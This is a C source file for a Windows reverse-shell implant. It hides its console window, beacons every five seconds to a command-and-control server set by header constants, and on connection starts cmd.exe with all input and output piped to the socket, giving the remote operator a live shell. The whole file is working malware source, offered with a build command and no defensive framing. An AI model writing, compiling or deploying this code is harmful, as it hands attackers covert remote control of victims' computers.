#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "revshell.h"

/* IMPORTANT: need to link with ws2_32 (i686-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32) */

int main(int argc, char* argv[])
{
	WSADATA wsa;
	FreeConsole();

	/* initialize win sock version*/
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		exit(0);

	beacon();
}

/* continually beacon the C2 (add random interval) */
static void beacon()
{
	SOCKET sock;
	struct sockaddr_in server;
	char reply_buffer[1024] = { 0 };
	int recv_size;

	while (TRUE)
	{
		Sleep(5000);

		if ((sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) != INVALID_SOCKET)
		{
			server.sin_addr.s_addr = inet_addr(C2SERVER);
			server.sin_family = AF_INET;
			server.sin_port = htons(C2PORT);

			if (!WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL))
			{
				/* get data from C2 before continuing (add config)*/
				if ((recv_size = recv(sock, reply_buffer, 1024, 0)) != SOCKET_ERROR)
					spawn_shell(sock);
			}
		}

		WSACleanup();
		closesocket(sock);
		continue;
	}
}

/* spawn a shell with the cmd process and pipe stdin, out, and err to the socket */
static void spawn_shell(SOCKET sock_pipe)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	/* send stdin, stdout, and stderr of the created process to the socket connection (C2Server) */
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock_pipe;

	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		return;

	/* wait for the process to end, then close the handles */
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

